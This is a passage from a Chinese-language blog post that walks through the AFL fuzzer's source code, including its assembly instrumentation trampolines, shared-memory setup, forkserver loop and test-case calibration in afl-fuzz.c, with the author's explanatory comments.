&quot;\n&quot;<br>  &quot;.align 4\n&quot;<br>  &quot;\n&quot;<br>  &quot;leal -16(%%esp), %%esp\n&quot;<br>  &quot;movl %%edi,  0(%%esp)\n&quot;<br>  &quot;movl %%edx,  4(%%esp)\n&quot;<br>  &quot;movl %%ecx,  8(%%esp)\n&quot;<br>  &quot;movl %%eax, 12(%%esp)\n&quot;<br>  &quot;movl $0x%08x, %%ecx\n&quot;<br>  &quot;call __afl_maybe_log\n&quot;<br>  &quot;movl 12(%%esp), %%eax\n&quot;<br>  &quot;movl  8(%%esp), %%ecx\n&quot;<br>  &quot;movl  4(%%esp), %%edx\n&quot;<br>  &quot;movl  0(%%esp), %%edi\n&quot;<br>  &quot;leal 16(%%esp), %%esp\n&quot;<br>  &quot;\n&quot;<br>  &quot;/* --- END --- */\n&quot;<br>  &quot;\n&quot;;<br><br>static const u8* trampoline_fmt_64 =<br><br>  &quot;\n&quot;<br>  &quot;/* --- AFL TRAMPOLINE (64-BIT) --- */\n&quot;<br>  &quot;\n&quot;<br>  &quot;.align 4\n&quot;<br>  &quot;\n&quot;<br>  &quot;leaq -(128+24)(%%rsp), %%rsp\n&quot;<br>  &quot;movq %%rdx,  0(%%rsp)\n&quot; <br>  &quot;movq %%rcx,  8(%%rsp)\n&quot;<br>  &quot;movq %%rax, 16(%%rsp)\n&quot; // save rdx rcx rax <br>  &quot;movq $0x%08x, %%rcx\n&quot; // set what will be print by fprintf() in rcx<br>  &quot;call __afl_maybe_log\n&quot;<br>  &quot;movq 16(%%rsp), %%rax\n&quot;<br>  &quot;movq  8(%%rsp), %%rcx\n&quot;<br>  &quot;movq  0(%%rsp), %%rdx\n&quot; // 恢复寄存器<br>  &quot;leaq (128+24)(%%rsp), %%rsp\n&quot;<br>  &quot;\n&quot;<br>  &quot;/* --- END --- */\n&quot;<br>  &quot;\n&quot;;<br></code></pre></td></tr></table></figure><p>其中，真正的核心是<code>call __afl_maybe_log</code><br>这个指令来自<code>main_payload_64/32</code><br><strong>__afl_maybe_log</strong><br>其中<code>__afl_maybe_log</code>定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&quot;__afl_maybe_log:\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  lahf\n&quot;</span><br>  <span class="hljs-string">&quot;  seto  %al\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  /* Check if SHM region is already mapped. */\n&quot;</span><span class="hljs-comment">//检查共享内存是否进行了设置</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  movq  __afl_area_ptr(%rip), %rdx\n&quot;</span><br>  <span class="hljs-string">&quot;  testq %rdx, %rdx\n&quot;</span> <span class="hljs-comment">// 判断__afl_area_ptr是否为null</span><br>  <span class="hljs-string">&quot;  je    __afl_setup\n&quot;</span> <span class="hljs-comment">// 为空则跳转</span><br></code></pre></td></tr></table></figure><p>使用<code>lahf</code>指令，加载状态标志位到<code>AH</code>，即<code>EFLAG</code>寄存器低八位复制到<code>AH</code>中，被复制的标志位包括：符号标志位（SF）、零标志位（ZF）、辅助进位标志位（AF）、奇偶标志位（PF）和进位标志位（CF），使用该指令可以方便地将标志位副本保存在变量中；<br>然后，使用<code>seto %al</code>溢出置位，即<strong>“如果溢出，则%al设置为1”</strong></p><p><strong>__afl_setup</strong><br>用于初始化<code>__afl_area_ptr</code>，且只在运行到第一个桩时进行本次初始化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&quot;__afl_setup:\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  /* Do not retry setup if we had previous failures. */\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  cmpb $0, __afl_setup_failure(%rip)\n&quot;</span><br>  <span class="hljs-string">&quot;  jne __afl_return\n&quot;</span><span class="hljs-comment">//先检查是否为0，不是则直接返回，“防止预先可预见的失败”</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  /* Check out if we have a global pointer on file. */\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  movq  __afl_global_area_ptr(%rip), %rdx\n&quot;</span><br>  <span class="hljs-string">&quot;  testq %rdx, %rdx\n&quot;</span><br>  <span class="hljs-string">&quot;  je    __afl_setup_first\n&quot;</span> <span class="hljs-comment">// 如果global pointer也为空，进行初次建立</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rdx, __afl_area_ptr(%rip)\n&quot;</span><span class="hljs-comment">//否则直接赋值给area ptr，然后进入store</span><br>  <span class="hljs-string">&quot;  jmp  __afl_store\n&quot;</span> <br></code></pre></td></tr></table></figure><p><strong>__afl-setup_first</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&quot;__afl_setup_first:\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  /* Save everything that is not yet saved and that may be touched by\n&quot;</span><br>  <span class="hljs-string">&quot;     getenv() and several other libcalls we&#x27;ll be relying on. */\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  leaq -352(%rsp), %rsp\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rax,   0(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rcx,   8(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rdi,  16(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rsi,  32(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %r8,   40(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %r9,   48(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %r10,  56(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %r11,  64(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm0,  96(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm1,  112(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm2,  128(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm3,  144(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm4,  160(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm5,  176(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm6,  192(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm7,  208(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm8,  224(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm9,  240(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm10, 256(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm11, 272(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm12, 288(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm13, 304(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm14, 320(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm15, 336(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  /* Map SHM, jumping to __afl_setup_abort if something goes wrong. */\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  /* The 64-bit ABI requires 16-byte stack alignment. We&#x27;ll keep the\n&quot;</span><br>  <span class="hljs-string">&quot;     original stack ptr in the callee-saved r12. */\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  pushq %r12\n&quot;</span><br>  <span class="hljs-string">&quot;  movq  %rsp, %r12\n&quot;</span><br>  <span class="hljs-string">&quot;  subq  $16, %rsp\n&quot;</span><br>  <span class="hljs-string">&quot;  andq  $0xfffffffffffffff0, %rsp\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  leaq .AFL_SHM_ENV(%rip), %rdi\n&quot;</span><br>  CALL_L64(<span class="hljs-string">&quot;getenv&quot;</span>)<br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  testq %rax, %rax\n&quot;</span><br>  <span class="hljs-string">&quot;  je    __afl_setup_abort\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  movq  %rax, %rdi\n&quot;</span><br>  CALL_L64(<span class="hljs-string">&quot;atoi&quot;</span>)<br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  xorq %rdx, %rdx   /* shmat flags    */\n&quot;</span><br>  <span class="hljs-string">&quot;  xorq %rsi, %rsi   /* requested addr */\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rax, %rdi   /* SHM ID         */\n&quot;</span><br>  CALL_L64(<span class="hljs-string">&quot;shmat&quot;</span>)<br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  cmpq $-1, %rax\n&quot;</span><br>  <span class="hljs-string">&quot;  je   __afl_setup_abort\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  /* Store the address of the SHM region. */\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rax, %rdx\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rax, __afl_area_ptr(%rip)\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__</span><br>  <span class="hljs-string">&quot;  movq %rax, __afl_global_area_ptr(%rip)\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-string">&quot;  movq __afl_global_area_ptr@GOTPCREL(%rip), %rdx\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rax, (%rdx)\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^__APPLE__ */</span></span><br>  <span class="hljs-string">&quot;  movq %rax, %rdx\n&quot;</span><br></code></pre></td></tr></table></figure><p>先将所有寄存器内容进行保存，然后寻找共享内存，如果找不到，就调用<code>__afl_setup_abort</code><br>成功后，调用<code>__afl_forkserver</code><br><strong>__afl_forkserver</strong><br>判断fork server是否成功启动。<br><strong>__afl_fork_wait_loop</strong></p><ul><li>从管道中等待parent的信息，读入<code>__afl_temp</code>内，成功则继续；</li><li>fork一个子进程，子进程执行<code>__afl_fork_resume</code>；</li><li>将子进程pid赋值给<code>__afl_fork_pid</code>，并写入状态管道通知父进程；</li><li>子进程结束后告诉fuzzer，下一轮循环开始。</li></ul><h2 id="afl-fuzz-c"><a href="#afl-fuzz-c" class="headerlink" title="afl-fuzz.c"></a>afl-fuzz.c</h2><p>该文件是afl项目的核心中的核心<br>此文件篇幅过长，选择直接从main函数入口开始看（共8k余行，main位于7706行）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">SAYF(cCYA <span class="hljs-string">&quot;afl-fuzz &quot;</span> cBRI VERSION cRST <span class="hljs-string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);<br><br>  doc_path = access(DOC_PATH, F_OK) ? <span class="hljs-string">&quot;docs&quot;</span> : DOC_PATH;<br><br>  gettimeofday(&amp;tv, &amp;tz);<br>  srandom(tv.tv_sec ^ tv.tv_usec ^ getpid());<br></code></pre></td></tr></table></figure><p>感觉是很常见的函数开头，之前读过的几个函数开始也有这几行—-打印版本信息、寻找路径信息、获取时间、获取随机数<br><strong>第一个while循环，进行参数读取</strong><br>随后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">setup_signal_handlers();<span class="hljs-comment">// 注册信号处理函数。</span><br>  check_asan_opts();<span class="hljs-comment">// 读取环境变量</span><br></code></pre></td></tr></table></figure><p><strong>setup_shm函数</strong><br>该函数用于设置共享内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">EXP_ST <span class="hljs-type">void</span> <span class="hljs-title function_">setup_shm</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br><br>  u8* shm_str;<br><br>  <span class="hljs-keyword">if</span> (!in_bitmap) <span class="hljs-built_in">memset</span>(virgin_bits, <span class="hljs-number">255</span>, MAP_SIZE);<br><br>  <span class="hljs-built_in">memset</span>(virgin_tmout, <span class="hljs-number">255</span>, MAP_SIZE);<span class="hljs-comment">//记录所有程序超时</span><br>  <span class="hljs-built_in">memset</span>(virgin_crash, <span class="hljs-number">255</span>, MAP_SIZE);<span class="hljs-comment">//记录所有程序崩溃</span><br><br>  shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | <span class="hljs-number">0600</span>);<br><br>  <span class="hljs-keyword">if</span> (shm_id &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;shmget() failed&quot;</span>);<br><br>  atexit(remove_shm);<br><br>  shm_str = alloc_printf(<span class="hljs-string">&quot;%d&quot;</span>, shm_id);<br><br>  <span class="hljs-comment">/* If somebody is asking us to fuzz instrumented binaries in dumb mode,</span><br><span class="hljs-comment">     we don&#x27;t want them to detect instrumentation, since we won&#x27;t be sending</span><br><span class="hljs-comment">     fork server commands. This should be replaced with better auto-detection</span><br><span class="hljs-comment">     later on, perhaps? */</span><br><br>  <span class="hljs-keyword">if</span> (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, <span class="hljs-number">1</span>);<br><br>  ck_free(shm_str);<br><br>  trace_bits = shmat(shm_id, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-keyword">if</span> (!trace_bits) PFATAL(<span class="hljs-string">&quot;shmat() failed&quot;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>其中：<code>shmat</code>方法用于追踪当前的tuple信息，<code>trace_bits</code>位于共享内存上，用于传送信息。</p><p><strong>第一遍fuzz</strong></p><p><strong>calibrate_case函数</strong><br>是AFL的一个关键函数，用于新测试用例的校准，希望能早期发现有问题的测试用例。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> u8 <span class="hljs-title function_">calibrate_case</span><span class="hljs-params">(<span class="hljs-type">char</span>** argv, <span class="hljs-keyword">struct</span> queue_entry* q, u8* use_mem,</span><br><span class="hljs-params">                         u32 handicap, u8 from_queue)</span> &#123;<br><br>  <span class="hljs-type">static</span> u8 first_trace[MAP_SIZE];<br><br>  u8  fault = <span class="hljs-number">0</span>, new_bits = <span class="hljs-number">0</span>, var_detected = <span class="hljs-number">0</span>,<br>      first_run = (q-&gt;exec_cksum == <span class="hljs-number">0</span>);<br><br>  u64 start_us, stop_us;<br><br>  s32 old_sc = stage_cur, old_sm = stage_max;<br>  u32 use_tmout = exec_tmout;<br>  u8* old_sn = stage_name;<br><br>  <span class="hljs-comment">/* Be a bit more generous about timeouts when resuming sessions, or when</span><br><span class="hljs-comment">     trying to calibrate already-added finds. This helps avoid trouble due</span><br><span class="hljs-comment">     to intermittent latency. */</span><br><br>  <span class="hljs-keyword">if</span> (!from_queue || resuming_fuzz)<br>    use_tmout = MAX(exec_tmout + CAL_TMOUT_ADD,<br>                    exec_tmout * CAL_TMOUT_PERC / <span class="hljs-number">100</span>);<br><br>  q-&gt;cal_failed++;<br><br>  stage_name = <span class="hljs-string">&quot;calibration&quot;</span>;<br>  stage_max  = fast_cal ? <span class="hljs-number">3</span> : CAL_CYCLES;<br><br>  <span class="hljs-comment">/* Make sure the forkserver is up before we do anything, and let&#x27;s not</span><br><span class="hljs-comment">     count its spin-up time toward binary calibration. */</span><br><br>  <span class="hljs-keyword">if</span> (dumb_mode != <span class="hljs-number">1</span> &amp;&amp; !no_forkserver &amp;&amp; !forksrv_pid)<br>    init_forkserver(argv); <span class="hljs-comment">// 初始化启动forkserver</span><br><br>  <span class="hljs-keyword">if</span> (q-&gt;exec_cksum) <span class="hljs-built_in">memcpy</span>(first_trace, trace_bits, MAP_SIZE);<br><br>  start_us = get_cur_time_us();<span class="hljs-comment">// </span><br><br>  <span class="hljs-keyword">for</span> (stage_cur = <span class="hljs-number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;<span class="hljs-comment">// 该循环执行3或8次</span><br><br>    u32 cksum;<br><br>    <span class="hljs-keyword">if</span> (!first_run &amp;&amp; !(stage_cur % stats_update_freq)) show_stats();<br><br>    write_to_testcase(use_mem, q-&gt;len);<br><br>    fault = run_target(argv, use_tmout);<span class="hljs-comment">//run_target函数通知forkserver可以开始fork</span><br><br>    <span class="hljs-comment">/* stop_soon is set by the handler for Ctrl+C. When it&#x27;s pressed,</span><br><span class="hljs-comment">       we want to bail out quickly. */</span><br><br>    <span class="hljs-keyword">if</span> (stop_soon || fault != crash_mode) <span class="hljs-keyword">goto</span> abort_calibration;<br><br>    <span class="hljs-keyword">if</span> (!dumb_mode &amp;&amp; !stage_cur &amp;&amp; !count_bytes(trace_bits)) &#123;<br>      fault = FAULT_NOINST;<br>      <span class="hljs-keyword">goto</span> abort_calibration;<br>    &#125;<br><br>    cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST);<span class="hljs-comment">//计算trace_bits的哈希值</span><br><br>    <span class="hljs-keyword">if</span> (q-&gt;exec_cksum != cksum) &#123;<span class="hljs-comment">//若哈希值不同</span><br><br>      u8 hnb = has_new_bits(virgin_bits);<br>      <span class="hljs-keyword">if</span> (hnb &gt; new_bits) new_bits = hnb;<span class="hljs-comment">//如果hnb＞new_bits，证明该new_bits已经跑过，将新的hnb赋值给new_bits,令其重新开始下一轮循环</span><br><br>      <span class="hljs-keyword">if</span> (q-&gt;exec_cksum) &#123;<span class="hljs-comment">// exec_cksum是循环次数，若不是第一次跑</span><br><br>        u32 i;<br><br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAP_SIZE; i++) &#123;<br><br>          <span class="hljs-keyword">if</span> (!var_bytes[i] &amp;&amp; first_trace[i] != trace_bits[i]) &#123;<br><br>            var_bytes[i] = <span class="hljs-number">1</span>;<br>            stage_max    = CAL_CYCLES_LONG;<br><br>          &#125;<br><br>        &#125;<br><br>        var_detected = <span class="hljs-number">1</span>;<br><br>      &#125; <span class="hljs-keyword">else</span> &#123;<br><br>        q-&gt;exec_cksum = cksum;<br>        <span class="hljs-built_in">memcpy</span>(first_trace, trace_bits, MAP_SIZE);<br><br>      &#125;<br><br>    &#125;<br><br>  &#125;<br><br>  stop_us = get_cur_time_us();<br><br>  <br></code></pre></td></tr></table></figure><p><strong>init_forkserver函数</strong><br>该函数实现启动forkserver</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span 